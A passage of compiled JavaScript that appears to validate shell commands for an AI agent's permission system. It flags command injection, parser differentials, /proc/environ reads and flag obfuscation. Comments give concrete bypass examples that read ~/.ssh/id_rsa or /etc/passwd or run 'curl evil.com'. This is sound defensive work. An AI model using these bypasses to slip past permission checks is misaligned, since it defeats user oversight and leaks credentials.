        /-name\s+["'][^"']*[;|&][^"']*["']/,
        /-path\s+["'][^"']*[;|&][^"']*["']/,
        /-iname\s+["'][^"']*[;|&][^"']*["']/,
    ];
    if (globPatterns.some(function (p) { return p.test(unquotedContent); })) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
            subId: 2,
        });
        return { behavior: 'ask', message: message };
    }
    if (/-regex\s+["'][^"']*[;&][^"']*["']/.test(unquotedContent)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
            subId: 3,
        });
        return { behavior: 'ask', message: message };
    }
    return { behavior: 'passthrough', message: 'No metacharacters' };
}
function validateDangerousVariables(context) {
    var fullyUnquotedContent = context.fullyUnquotedContent;
    if (/[<>|]\s*\$[A-Za-z_]/.test(fullyUnquotedContent) ||
        /\$[A-Za-z_][A-Za-z0-9_]*\s*[|<>]/.test(fullyUnquotedContent)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_VARIABLES,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'Command contains variables in dangerous contexts (redirections or pipes)',
        };
    }
    return { behavior: 'passthrough', message: 'No dangerous variables' };
}
function validateDangerousPatterns(context) {
    var unquotedContent = context.unquotedContent;
    // Special handling for backticks - check for UNESCAPED backticks only
    // Escaped backticks (e.g., \`) are safe and commonly used in SQL commands
    if (hasUnescapedChar(unquotedContent, '`')) {
        return {
            behavior: 'ask',
            message: 'Command contains backticks (`) for command substitution',
        };
    }
    // Other command substitution checks (include double-quoted content)
    for (var _i = 0, COMMAND_SUBSTITUTION_PATTERNS_1 = COMMAND_SUBSTITUTION_PATTERNS; _i < COMMAND_SUBSTITUTION_PATTERNS_1.length; _i++) {
        var _a = COMMAND_SUBSTITUTION_PATTERNS_1[_i], pattern = _a.pattern, message = _a.message;
        if (pattern.test(unquotedContent)) {
            (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION,
                subId: 1,
            });
            return { behavior: 'ask', message: "Command contains ".concat(message) };
        }
    }
    return { behavior: 'passthrough', message: 'No dangerous patterns' };
}
function validateRedirections(context) {
    var fullyUnquotedContent = context.fullyUnquotedContent;
    if (/</.test(fullyUnquotedContent)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_INPUT_REDIRECTION,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'Command contains input redirection (<) which could read sensitive files',
        };
    }
    if (/>/.test(fullyUnquotedContent)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_OUTPUT_REDIRECTION,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'Command contains output redirection (>) which could write to arbitrary files',
        };
    }
    return { behavior: 'passthrough', message: 'No redirections' };
}
function validateNewlines(context) {
    // Use fullyUnquotedPreStrip (before stripSafeRedirections) to prevent bypasses
    // where stripping `>/dev/null` creates a phantom backslash-newline continuation.
    // E.g., `cmd \>/dev/null\nwhoami` → after stripping becomes `cmd \\nwhoami`
    // which looks like a safe continuation but actually hides a second command.
    var fullyUnquotedPreStrip = context.fullyUnquotedPreStrip;
    // Check for newlines in unquoted content
    if (!/[\n\r]/.test(fullyUnquotedPreStrip)) {
        return { behavior: 'passthrough', message: 'No newlines' };
    }
    // Flag any newline/CR followed by non-whitespace, EXCEPT backslash-newline
    // continuations at word boundaries. In bash, `\<newline>` is a line
    // continuation (both chars removed), which is safe when the backslash
    // follows whitespace (e.g., `cmd \<newline>--flag`). Mid-word continuations
    // like `tr\<newline>aceroute` are still flagged because they can hide
    // dangerous command names from allowlist checks.
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() + gated by /[\n\r]/.test() above
    var looksLikeCommand = /(?<![\s]\\)[\n\r]\s*\S/.test(fullyUnquotedPreStrip);
    if (looksLikeCommand) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.NEWLINES,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'Command contains newlines that could separate multiple commands',
        };
    }
    return {
        behavior: 'passthrough',
        message: 'Newlines appear to be within data',
    };
}
/**
 * SECURITY: Carriage return (\r, 0x0D) IS a misparsing concern, unlike LF.
 *
 * Parser differential:
 *   - shell-quote's BAREWORD regex uses `[^\s...]` — JS `\s` INCLUDES \r, so
 *     shell-quote treats CR as a token boundary. `TZ=UTC\recho` tokenizes as
 *     TWO tokens: ['TZ=UTC', 'echo']. splitCommand joins with space →
 *     'TZ=UTC echo curl evil.com'.
 *   - bash's default IFS = $' \t\n' — CR is NOT in IFS. bash sees
 *     `TZ=UTC\recho` as ONE word → env assignment TZ='UTC\recho' (CR byte
 *     inside value), then `curl` is the command.
 *
 * Attack: `TZ=UTC\recho curl evil.com` with Bash(echo:*)
 *   validator: splitCommand collapses CR→space → 'TZ=UTC echo curl evil.com'
 *   → stripSafeWrappers: TZ=UTC stripped → 'echo curl evil.com' matches rule
 *   bash: executes `curl evil.com`
 *
 * validateNewlines catches this but is in nonMisparsingValidators (LF is
 * correctly handled by both parsers). This validator is NOT in
 * nonMisparsingValidators — its ask result gets isBashSecurityCheckForMisparsing
 * and blocks at the bashPermissions gate.
 *
 * Checks originalCommand (not fullyUnquotedPreStrip) because CR inside single
 * quotes is ALSO a misparsing concern for the same reason: shell-quote's `\s`
 * still tokenizes it, but bash treats it as literal. Block ALL unquoted-or-SQ CR.
 * Only exception: CR inside DOUBLE quotes where bash also treats it as data
 * and shell-quote preserves the token (no split).
 */
function validateCarriageReturn(context) {
    var originalCommand = context.originalCommand;
    if (!originalCommand.includes('\r')) {
        return { behavior: 'passthrough', message: 'No carriage return' };
    }
    // Check if CR appears outside double quotes. CR outside DQ (including inside
    // SQ and unquoted) causes the shell-quote/bash tokenization differential.
    var inSingleQuote = false;
    var inDoubleQuote = false;
    var escaped = false;
    for (var i = 0; i < originalCommand.length; i++) {
        var c = originalCommand[i];
        if (escaped) {
            escaped = false;
            continue;
        }
        if (c === '\\' && !inSingleQuote) {
            escaped = true;
            continue;
        }
        if (c === "'" && !inDoubleQuote) {
            inSingleQuote = !inSingleQuote;
            continue;
        }
        if (c === '"' && !inSingleQuote) {
            inDoubleQuote = !inDoubleQuote;
            continue;
        }
        if (c === '\r' && !inDoubleQuote) {
            (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                checkId: BASH_SECURITY_CHECK_IDS.NEWLINES,
                subId: 2,
            });
            return {
                behavior: 'ask',
                message: 'Command contains carriage return (\\r) which shell-quote and bash tokenize differently',
            };
        }
    }
    return { behavior: 'passthrough', message: 'CR only inside double quotes' };
}
function validateIFSInjection(context) {
    var originalCommand = context.originalCommand;
    // Detect any usage of IFS variable which could be used to bypass regex validation
    // Check for $IFS and ${...IFS...} patterns (including parameter expansions like ${IFS:0:1}, ${#IFS}, etc.)
    // Using ${[^}]*IFS to catch all parameter expansion variations with IFS
    if (/\$IFS|\$\{[^}]*IFS/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.IFS_INJECTION,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'Command contains IFS variable usage which could bypass security validation',
        };
    }
    return { behavior: 'passthrough', message: 'No IFS injection detected' };
}
// Additional hardening against reading environment variables via /proc filesystem.
// Path validation typically blocks /proc access, but this provides defense-in-depth.
// Environment files in /proc can expose sensitive data like API keys and secrets.
function validateProcEnvironAccess(context) {
    var originalCommand = context.originalCommand;
    // Check for /proc paths that could expose environment variables
    // This catches patterns like:
    // - /proc/self/environ
    // - /proc/1/environ
    // - /proc/*/environ (with any PID)
    if (/\/proc\/.*\/environ/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.PROC_ENVIRON_ACCESS,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'Command accesses /proc/*/environ which could expose sensitive environment variables',
        };
    }
    return {
        behavior: 'passthrough',
        message: 'No /proc/environ access detected',
    };
}
/**
 * Detects commands with malformed tokens (unbalanced delimiters) combined with
 * command separators. This catches potential injection patterns where ambiguous
 * shell syntax could be exploited.
 *
 * Security: This check catches the eval bypass discovered in HackerOne review.
 * When shell-quote parses ambiguous patterns like `echo {"hi":"hi;evil"}`,
 * it may produce unbalanced tokens (e.g., `{hi:"hi`). Combined with command
 * separators, this can lead to unintended command execution via eval re-parsing.
 *
 * By forcing user approval for these patterns, we ensure the user sees exactly
 * what will be executed before approving.
 */
function validateMalformedTokenInjection(context) {
    var originalCommand = context.originalCommand;
    var parseResult = (0, shellQuote_js_1.tryParseShellCommand)(originalCommand);
    if (!parseResult.success) {
        // Parse failed - this is handled elsewhere (bashToolHasPermission checks this)
        return {
            behavior: 'passthrough',
            message: 'Parse failed, handled elsewhere',
        };
    }
    var parsed = parseResult.tokens;
    // Check for command separators (;, &&, ||)
    var hasCommandSeparator = parsed.some(function (entry) {
        return typeof entry === 'object' &&
            entry !== null &&
            'op' in entry &&
            (entry.op === ';' || entry.op === '&&' || entry.op === '||');
    });
    if (!hasCommandSeparator) {
        return { behavior: 'passthrough', message: 'No command separators' };
    }
    // Check for malformed tokens (unbalanced delimiters)
    if ((0, shellQuote_js_1.hasMalformedTokens)(originalCommand, parsed)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.MALFORMED_TOKEN_INJECTION,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'Command contains ambiguous syntax with command separators that could be misinterpreted',
        };
    }
    return {
        behavior: 'passthrough',
        message: 'No malformed token injection detected',
    };
}
function validateObfuscatedFlags(context) {
    // Block shell quoting bypass patterns used to circumvent negative lookaheads we use in our regexes to block known dangerous flags
    var originalCommand = context.originalCommand, baseCommand = context.baseCommand;
    // Echo is safe for obfuscated flags, BUT only for simple echo commands.
    // For compound commands (with |, &, ;), we need to check the whole command
    // because the dangerous ANSI-C quoting might be after the operator.
    var hasShellOperators = /[|&;]/.test(originalCommand);
    if (baseCommand === 'echo' && !hasShellOperators) {
        return {
            behavior: 'passthrough',
            message: 'echo command is safe and has no dangerous flags',
        };
    }
    // COMPREHENSIVE OBFUSCATION DETECTION
    // These checks catch various ways to hide flags using shell quoting
    // 1. Block ANSI-C quoting ($'...') - can encode any character via escape sequences
    // Simple pattern that matches $'...' anywhere. This correctly handles:
    // - grep '$' file => no match ($ is regex anchor inside quotes, no $'...' structure)
    // - 'test'$'-exec' => match (quote concatenation with ANSI-C)
    // - Zero-width space and other invisible chars => match
    // The pattern requires $' followed by content (can be empty) followed by closing '
    if (/\$'[^']*'/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
            subId: 5,
        });
        return {
            behavior: 'ask',
            message: 'Command contains ANSI-C quoting which can hide characters',
        };
    }
    // 2. Block locale quoting ($"...")  - can also use escape sequences
    // Same simple pattern as ANSI-C quoting above
    if (/\$"[^"]*"/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
            subId: 6,
        });
        return {
            behavior: 'ask',
            message: 'Command contains locale quoting which can hide characters',
        };
    }
    // 3. Block empty ANSI-C or locale quotes followed by dash
    // $''-exec or $""-exec
    if (/\$['"]{2}\s*-/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
            subId: 9,
        });
        return {
            behavior: 'ask',
            message: 'Command contains empty special quotes before dash (potential bypass)',
        };
    }
    // 4. Block ANY sequence of empty quotes followed by dash
    // This catches: ''-  ""-  ''""-  ""''-  ''""''-  etc.
    // The pattern looks for one or more empty quote pairs followed by optional whitespace and dash
    if (/(?:^|\s)(?:''|"")+\s*-/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
            subId: 7,
        });
        return {
            behavior: 'ask',
            message: 'Command contains empty quotes before dash (potential bypass)',
        };
    }
    // 4b. SECURITY: Block homogeneous empty quote pair(s) immediately adjacent
    // to a quoted dash. Patterns like `"""-f"` (empty `""` + quoted `"-f"`)
    // concatenate in bash to `-f` but slip past all the above checks:
    //   - Regex (4) above: `(?:''|"")+\s*-` matches `""` pair, then expects
    //     optional space and dash — but finds a third `"` instead. No match.
    //   - Quote-content scanner (below): Sees the first `""` pair with empty
    //     content (doesn't start with dash). The third `"` opens a new quoted
    //     region handled by the main quote-state tracker.
    //   - Quote-state tracker: `""` toggles inDoubleQuote on/off; third `"`
    //     opens it again. The `-` inside `"-f"` is INSIDE quotes → skipped.
    //   - Flag scanner: Looks for `\s` before `-`. The `-` is preceded by `"`.
    //   - fullyUnquotedContent: Both `""` and `"-f"` get stripped.
    //
    // In bash, `"""-f"` = empty string + string "-f" = `-f`. This bypass works
    // for ANY dangerous-flag check (jq -f, find -exec, fc -e) with a matching
    // prefix permission (Bash(jq:*), Bash(find:*)).
    //
    // The regex `(?:""|'')+['"]-` matches:
    //   - One or more HOMOGENEOUS empty pairs (`""` or `''`) — the concatenation
    //     point where bash joins the empty string to the flag.
    //   - Immediately followed by ANY quote char — opens the flag-quoted region.
    //   - Immediately followed by `-` — the obfuscated flag.
    //
    // POSITION-AGNOSTIC: We do NOT require word-start (`(?:^|\s)`) because
    // prefixes like `$x"""-f"` (unset/empty variable) concatenate the same way.
    // The homogeneous-empty-pair requirement filters out the `'"'"'` idiom
    // (no homogeneous empty pair — it's close, double-quoted-content, open).
    //
    // FALSE POSITIVE: Matches `echo '"""-f" text'` (pattern inside single-quoted
    // string). Extremely rare (requires echoing the literal attack). Acceptable.
    if (/(?:""|'')+['"]-/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
            subId: 10,
        });
        return {
            behavior: 'ask',
            message: 'Command contains empty quote pair adjacent to quoted dash (potential flag obfuscation)',
        };
    }
    // 4c. SECURITY: Also block 3+ consecutive quotes at word start even without
    // an immediate dash. Broader safety net for multi-quote obfuscation patterns
    // not enumerated above (e.g., `"""x"-f` where content between quotes shifts
    // the dash position). Legitimate commands never need `"""x"` when `"x"` works.
    if (/(?:^|\s)['"]{3,}/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
            subId: 11,
        });
        return {
            behavior: 'ask',
            message: 'Command contains consecutive quote characters at word start (potential obfuscation)',
        };
    }
    // Track quote state to avoid false positives for flags inside quoted strings
    var inSingleQuote = false;
    var inDoubleQuote = false;
    var escaped = false;
    var _loop_1 = function (i) {
        var currentChar = originalCommand[i];
        var nextChar = originalCommand[i + 1];
        // Update quote state
        if (escaped) {
            escaped = false;
            return "continue";
        }
        // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
        // `\` inside `'...'` is LITERAL. Without this guard, `'\'` desyncs the
        // quote tracker: `\` sets escaped=true, closing `'` is consumed by the
        // escaped-skip above instead of toggling inSingleQuote. Parser stays in
        // single-quote mode, and the `if (inSingleQuote || inDoubleQuote) continue`
        // at line ~1121 skips ALL subsequent flag detection for the rest of the
        // command. Example: `jq '\' "-f" evil` — bash gets `-f` arg, but desynced
        // parser thinks ` "-f" evil` is inside quotes → flag detection bypassed.
        // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns at
        // line ~1856 before this runs. But we fix the tracker for consistency with
        // the CORRECT implementations elsewhere in this file (hasBackslashEscaped*,
        // extractQuotedContent) which all guard with `!inSingleQuote`.
        if (currentChar === '\\' && !inSingleQuote) {
            escaped = true;
            return "continue";
        }
        if (currentChar === "'" && !inDoubleQuote) {
            inSingleQuote = !inSingleQuote;
            return "continue";
        }
        if (currentChar === '"' && !inSingleQuote) {
            inDoubleQuote = !inDoubleQuote;
            return "continue";
        }
        // Only look for flags when not inside quoted strings
        // This prevents false positives like: make test TEST="file.py -v"
        if (inSingleQuote || inDoubleQuote) {
            return "continue";
        }
        // Look for whitespace followed by quote that contains a dash (potential flag obfuscation)
        // SECURITY: Block ANY quoted content starting with dash - err on side of safety
        // Catches: "-"exec, "-file", "--flag", '-'output, etc.
        // Users can approve manually if legitimate (e.g., find . -name "-file")
        if (currentChar &&
            nextChar &&
            /\s/.test(currentChar) &&
            /['"`]/.test(nextChar)) {
            var quoteChar = nextChar;
            var j_1 = i + 2; // Start after the opening quote
            var insideQuote_1 = '';
            // Collect content inside the quote
            while (j_1 < originalCommand.length && originalCommand[j_1] !== quoteChar) {
                insideQuote_1 += originalCommand[j_1];
                j_1++;
            }
            // If we found a closing quote and the content looks like an obfuscated flag, block it.
            // Three attack patterns to catch:
            //   1. Flag name inside quotes: "--flag", "-exec", "-X" (dashes + letters inside)
            //   2. Split-quote flag: "-"exec, "--"output (dashes inside, letters continue after quote)
            //   3. Chained quotes: "-""exec" (dashes in first quote, second quote contains letters)
            // Pure-dash strings like "---" or "--" followed by whitespace/separator are separators,
            // not flags, and should not trigger this check.
            var charAfterQuote = originalCommand[j_1 + 1];
            // Inside double quotes, $VAR and `cmd` expand at runtime, so "-$VAR" can
            // become -exec. Blocking $ and ` here over-blocks single-quoted literals
            // like grep '-$' (where $ is literal), but main's startsWith('-') already
            // blocked those — this restores status quo, not a new false positive.
            // Brace expansion ({) does NOT happen inside quotes, so { is not needed here.
            var hasFlagCharsInside = /^-+[a-zA-Z0-9$`]/.test(insideQuote_1);
            // Characters that can continue a flag after a closing quote. This catches:
            //   a-zA-Z0-9: "-"exec → -exec (direct concatenation)
            //   \\:        "-"\exec → -exec (backslash escape is stripped)
            //   -:         "-"-output → --output (extra dashes)
            //   {:         "-"{exec,delete} → -exec -delete (brace expansion)
            //   $:         "-"$VAR → -exec when VAR=exec (variable expansion)
            //   `:         "-"`echo exec` → -exec (command substitution)
            // Note: glob chars (*?[) are omitted — they require attacker-controlled
            // filenames in CWD to exploit, and blocking them would break patterns
            // like `ls -- "-"*` for listing files that start with dash.
            var FLAG_CONTINUATION_CHARS_1 = /[a-zA-Z0-9\\${`-]/;
            var hasFlagCharsContinuing = /^-+$/.test(insideQuote_1) &&
                charAfterQuote !== undefined &&
                FLAG_CONTINUATION_CHARS_1.test(charAfterQuote);
            // Handle adjacent quote chaining: "-""exec" or "-""-"exec or """-"exec concatenates
            // to -exec in shell. Follow the chain of adjacent quoted segments until
            // we find one containing an alphanumeric char or hit a non-quote boundary.
            // Also handles empty prefix quotes: """-"exec where "" is followed by "-"exec
            // The combined segments form a flag if they contain dash(es) followed by alphanumerics.
            var hasFlagCharsInNextQuote = 
            // Trigger when: first segment is only dashes OR empty (could be prefix for flag)
            (insideQuote_1 === '' || /^-+$/.test(insideQuote_1)) &&
                charAfterQuote !== undefined &&
                /['"`]/.test(charAfterQuote) &&
                (function () {
                    var pos = j_1 + 1; // Start at charAfterQuote (an opening quote)
                    var combinedContent = insideQuote_1; // Track what the shell will see
                    while (pos < originalCommand.length &&
                        /['"`]/.test(originalCommand[pos])) {
                        var segQuote = originalCommand[pos];
                        var end = pos + 1;
                        while (end < originalCommand.length &&
                            originalCommand[end] !== segQuote) {
                            end++;
                        }
                        var segment = originalCommand.slice(pos + 1, end);
                        combinedContent += segment;
                        // Check if combined content so far forms a flag pattern.
                        // Include $ and ` for in-quote expansion: "-""$VAR" → -exec
                        if (/^-+[a-zA-Z0-9$`]/.test(combinedContent))
                            return true;
                        // If this segment has alphanumeric/expansion and we already have dashes,
                        // it's a flag. Catches "-""$*" where segment='$*' has no alnum but
                        // expands to positional params at runtime.
                        // Guard against segment.length === 0: slice(0, -0) → slice(0, 0) → ''.
                        var priorContent = segment.length > 0
                            ? combinedContent.slice(0, -segment.length)
                            : combinedContent;
                        if (/^-+$/.test(priorContent)) {
                            if (/[a-zA-Z0-9$`]/.test(segment))
                                return true;
                        }
                        if (end >= originalCommand.length)
                            break; // Unclosed quote
                        pos = end + 1; // Move past closing quote to check next segment
                    }
                    // Also check the unquoted char at the end of the chain
                    if (pos < originalCommand.length &&
                        FLAG_CONTINUATION_CHARS_1.test(originalCommand[pos])) {
                        // If we have dashes in combined content, the trailing char completes a flag
                        if (/^-+$/.test(combinedContent) || combinedContent === '') {
                            // Check if we're about to form a flag with the following content
                            var nextChar_1 = originalCommand[pos];
                            if (nextChar_1 === '-') {
                                // More dashes, could still form a flag
                                return true;
                            }
                            if (/[a-zA-Z0-9\\${`]/.test(nextChar_1) && combinedContent !== '') {
                                // We have dashes and now alphanumeric/expansion follows
                                return true;
                            }
                        }
                        // Original check for dashes followed by alphanumeric
                        if (/^-/.test(combinedContent)) {
                            return true;
                        }
                    }
                    return false;
                })();
            if (j_1 < originalCommand.length &&
                originalCommand[j_1] === quoteChar &&
                (hasFlagCharsInside ||
                    hasFlagCharsContinuing ||
                    hasFlagCharsInNextQuote)) {
                (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                    checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
                    subId: 4,
                });
                return { value: {
                        behavior: 'ask',
                        message: 'Command contains quoted characters in flag names',
                    } };
            }
        }
        // Look for whitespace followed by dash - this starts a flag
        if (currentChar && nextChar && /\s/.test(currentChar) && nextChar === '-') {
            var j = i + 1; // Start at the dash
            var flagContent = '';
            // Collect flag content
            while (j < originalCommand.length) {
                var flagChar = originalCommand[j];
                if (!flagChar)
                    break;
                // End flag content once we hit whitespace or an equals sign
                if (/[\s=]/.test(flagChar)) {
                    break;
                }
                // End flag collection if we hit quote followed by non-flag character. This is needed to handle cases like -d"," which should be parsed as just -d
                if (/['"`]/.test(flagChar)) {
                    // Special case for cut -d flag: the delimiter value can be quoted
                    // Example: cut -d'"' should parse as flag name: -d, value: '"'
                    // Note: We only apply this exception to cut -d specifically to avoid bypasses.
                    // Without this restriction, a command like `find -e"xec"` could be parsed as
                    // flag name: -e, bypassing our blocklist for -exec. By restricting to cut -d,
                    // we allow the legitimate use case while preventing obfuscation attacks on other
                    // commands where quoted flag values could hide dangerous flag names.
                    if (baseCommand === 'cut' &&
                        flagContent === '-d' &&
                        /['"`]/.test(flagChar)) {
                        // This is cut -d followed by a quoted delimiter - flagContent is already '-d'
                        break;
                    }
                    // Look ahead to see what follows the quote
                    if (j + 1 < originalCommand.length) {
                        var nextFlagChar = originalCommand[j + 1];
                        if (nextFlagChar && !/[a-zA-Z0-9_'"-]/.test(nextFlagChar)) {
                            // Quote followed by something that is clearly not part of a flag, end the parsing
                            break;
                        }
                    }
                }
                flagContent += flagChar;
                j++;
            }
            if (flagContent.includes('"') || flagContent.includes("'")) {
                (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                    checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
                    subId: 1,
                });
                return { value: {
                        behavior: 'ask',
                        message: 'Command contains quoted characters in flag names',
                    } };
            }
        }
    };
    for (var i = 0; i < originalCommand.length - 1; i++) {
        var state_1 = _loop_1(i);
        if (typeof state_1 === "object")
            return state_1.value;
    }
    // Also handle flags that start with quotes: "--"output, '-'-output, etc.
    // Use fullyUnquotedContent to avoid false positives from legitimate quoted content like echo "---"
    if (/\s['"`]-/.test(context.fullyUnquotedContent)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
            subId: 2,
        });
        return {
            behavior: 'ask',
            message: 'Command contains quoted characters in flag names',
        };
    }
    // Also handles cases like ""--output
    // Use fullyUnquotedContent to avoid false positives from legitimate quoted content
    if (/['"`]{2}-/.test(context.fullyUnquotedContent)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
            subId: 3,
        });
        return {
            behavior: 'ask',
            message: 'Command contains quoted characters in flag names',
        };
    }
    return { behavior: 'passthrough', message: 'No obfuscated flags detected' };
}
/**
 * Detects backslash-escaped whitespace characters (space, tab) outside of quotes.
 *
 * In bash, `echo\ test` is a single token (command named "echo test"), but
 * shell-quote decodes the escape and produces `echo test` (two separate tokens).
 * This discrepancy allows path traversal attacks like:
 *   echo\ test/../../../usr/bin/touch /tmp/file
 * which the parser sees as `echo test/.../touch /tmp/file` (an echo command)
 * but bash resolves as `/usr/bin/touch /tmp/file` (via directory "echo test").
 */
function hasBackslashEscapedWhitespace(command) {
    var inSingleQuote = false;
    var inDoubleQuote = false;
    for (var i = 0; i < command.length; i++) {
        var char = command[i];
        if (char === '\\' && !inSingleQuote) {
            if (!inDoubleQuote) {
                var nextChar = command[i + 1];
                if (nextChar === ' ' || nextChar === '\t') {
                    return true;
                }
            }
            // Skip the escaped character (both outside quotes and inside double quotes,
            // where \\, \", \$, \` are valid escape sequences)
            i++;
            continue;
        }
        if (char === '"' && !inSingleQuote) {
            inDoubleQuote = !inDoubleQuote;
            continue;
        }
        if (char === "'" && !inDoubleQuote) {
            inSingleQuote = !inSingleQuote;
            continue;
        }
    }
    return false;
}
function validateBackslashEscapedWhitespace(context) {
    if (hasBackslashEscapedWhitespace(context.originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.BACKSLASH_ESCAPED_WHITESPACE,
        });
        return {
            behavior: 'ask',
            message: 'Command contains backslash-escaped whitespace that could alter command parsing',
        };
    }
    return {
        behavior: 'passthrough',
        message: 'No backslash-escaped whitespace',
    };
}
/**
 * Detects a backslash immediately preceding a shell operator outside of quotes.
 *
 * SECURITY: splitCommand normalizes `\;` to a bare `;` in its output string.
 * When downstream code (checkReadOnlyConstraints, checkPathConstraints, etc.)
 * re-parses that normalized string, the bare `;` is seen as an operator and
 * causes a false split. This enables arbitrary file read bypassing path checks:
 *
 *   cat safe.txt \; echo ~/.ssh/id_rsa
 *
 * In bash: ONE cat command reading safe.txt, ;, echo, ~/.ssh/id_rsa as files.
 * After splitCommand normalizes: "cat safe.txt ; echo ~/.ssh/id_rsa"
 * Nested re-parse: ["cat safe.txt", "echo ~/.ssh/id_rsa"] — both segments
 * pass isCommandReadOnly, sensitive path hidden in echo segment is never
 * validated by path constraints. Auto-allowed. Private key leaked.
 *
 * This check flags any \<operator> regardless of backslash parity. Even counts
 * (\\;) are dangerous in bash (\\ → \, ; separates). Odd counts (\;) are safe
 * in bash but trigger the double-parse bug above. Both must be flagged.
 *
 * Known false positive: `find . -exec cmd {} \;` — users will be prompted once.
 *
 * Note: `(` and `)` are NOT in this set — splitCommand preserves `\(` and `\)`
 * in its output (round-trip safe), so they don't trigger the double-parse bug.
 * This allows `find . \( -name x -o -name y \)` to pass without false positives.
 */
var SHELL_OPERATORS = new Set([';', '|', '&', '<', '>']);
function hasBackslashEscapedOperator(command) {
    var inSingleQuote = false;
    var inDoubleQuote = false;
    for (var i = 0; i < command.length; i++) {
        var char = command[i];
        // SECURITY: Handle backslash FIRST, before quote toggles. In bash, inside
        // double quotes, `\"` is an escape sequence producing a literal `"` — it
        // does NOT close the quote. If we process quote toggles first, `\"` inside
        // `"..."` desyncs the tracker:
        //   - `\` is ignored (gated by !inDoubleQuote)
        //   - `"` toggles inDoubleQuote to FALSE (wrong — bash says still inside)
        //   - next `"` (the real closing quote) toggles BACK to TRUE — locked desync
        //   - subsequent `\;` is missed because !inDoubleQuote is false
        // Exploit: `tac "x\"y" \; echo ~/.ssh/id_rsa` — bash runs ONE tac reading
        // all args as files (leaking id_rsa), but desynced tracker misses `\;` and
        // splitCommand's double-parse normalization "sees" two safe commands.
        //
        // Fix structure matches hasBackslashEscapedWhitespace (which was correctly
        // fixed for this in commit prior to d000dfe84e): backslash check first,
        // gated only by !inSingleQuote (since backslash IS literal inside '...'),
        // unconditional i++ to skip the escaped char even inside double quotes.
        if (char === '\\' && !inSingleQuote) {
            // Only flag \<operator> when OUTSIDE double quotes (inside double quotes,
            // operators like ;|&<> are already not special, so \; is harmless there).
            if (!inDoubleQuote) {
                var nextChar = command[i + 1];
                if (nextChar && SHELL_OPERATORS.has(nextChar)) {
                    return true;
                }
            }
            // Skip the escaped character unconditionally. Inside double quotes, this
            // correctly consumes backslash pairs: `"x\\"` → pos 6 (`\`) skips pos 7
            // (`\`), then pos 8 (`"`) toggles inDoubleQuote off correctly. Without
            // unconditional skip, pos 7 would see `\`, see pos 8 (`"`) as nextChar,
            // skip it, and the closing quote would NEVER toggle inDoubleQuote —
            // permanently desyncing and missing subsequent `\;` outside quotes.
            // Exploit: `cat "x\\" \; echo /etc/passwd` — bash reads /etc/passwd.
            //
            // This correctly handles backslash parity: odd-count `\;` (1, 3, 5...)
            // is flagged (the unpaired `\` before `;` is detected). Even-count `\\;`
            // (2, 4...) is NOT flagged, which is CORRECT — bash treats `\\` as
            // literal `\` and `;` as a separator, so splitCommand handles it
            // normally (no double-parse bug). This matches
            // hasBackslashEscapedWhitespace line ~1340.
            i++;
            continue;
        }
